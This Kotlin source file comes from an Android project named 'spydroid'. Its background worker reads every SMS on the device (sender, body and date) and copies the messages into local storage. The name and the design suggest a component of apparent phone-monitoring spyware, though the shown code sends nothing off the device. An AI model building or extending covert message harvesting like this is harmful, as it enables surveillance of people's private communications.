/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.feature.sms

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.icu.text.SimpleDateFormat
import android.net.Uri
import android.provider.Telephony
import android.util.Log
import android.widget.Toast
import androidx.work.Worker
import androidx.work.WorkerParameters
import dagger.hilt.EntryPoint
import dagger.hilt.InstallIn
import dagger.hilt.android.EntryPointAccessors
import dagger.hilt.components.SingletonComponent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.catch
import kotlinx.coroutines.flow.map
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import net.spydroid.common.local.LocalDataProvider
import net.spydroid.common.local.models.CurrentSms
import net.spydroid.feature.sms.local.domain.SmsRepository
import net.spydroid.feature.sms.local.models.SmsHandler
import net.spydroid.feature.sms.local.states.SmsState
import java.util.Date
import java.util.Locale
import javax.inject.Inject


@EntryPoint
@InstallIn(SingletonComponent::class)
interface SmsWorkEntryPoint {
    fun smsRepository(): SmsRepository
}


class SmsWork(private val context: Context, workerParams: WorkerParameters) :
    Worker(context, workerParams) {

    private val contentResolver: ContentResolver = context.contentResolver
    private val localDataProvider = LocalDataProvider.current(context)

    lateinit var smsRepository: SmsRepository

    init {
        val entryPoint = EntryPointAccessors.fromApplication(context, SmsWorkEntryPoint::class.java)
        smsRepository = entryPoint.smsRepository()
    }

    @OptIn(DelicateCoroutinesApi::class)
    override fun doWork(): Result {
        try {

            val smsState: StateFlow<SmsState> = smsRepository
                .sms.map<List<SmsHandler>, SmsState> { SmsState.Success(data = it) }
                .catch { emit(SmsState.Error(it)) }
                .stateIn(
                    CoroutineScope(Dispatchers.IO), SharingStarted.WhileSubscribed(5000),
                    SmsState.Loading
                )


            GlobalScope.launch(Dispatchers.Default) {
                smsState.collect{ state ->
                    when(state){
                        is SmsState.Loading -> {
                            //todo
                        }
                        is SmsState.Error -> {
                            //todo
                        }
                        is SmsState.Success -> {
                            val data = state.data
                            if (data.isNotEmpty()){
                                data.forEach {
                                    localDataProvider.setSmsCurrent(
                                        CurrentSms(
                                            address = it.address,
                                            body = it.body,
                                            date = it.date
                                        )
                                    )
                                }
                            }
                        }
                    }
                }
            }




            val uri: Uri = Telephony.Sms.CONTENT_URI
            val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)

            cursor?.use {
                val indexBody = it.getColumnIndex(Telephony.Sms.BODY)
                val indexAddress = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val indexDate = it.getColumnIndex(Telephony.Sms.DATE)

                while (it.moveToNext()) {
                    val body = it.getString(indexBody)
                    val address = it.getString(indexAddress)
                    val date = it.getLong(indexDate)

                    val dateSent = Date(date)
                    val format = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
                    val dateSentFormatted = format.format(dateSent)

                    /*
                   smsRepository.insert(
                        SmsHandler(
                            address = address,
                            body = body,
                            date = dateSentFormatted
                        )
                    )
                     */
                }
            } ?: run {
                return Result.failure()
            }
            return Result.success()
        } catch (e: Exception) {
            return Result.failure()
        }
    }
}
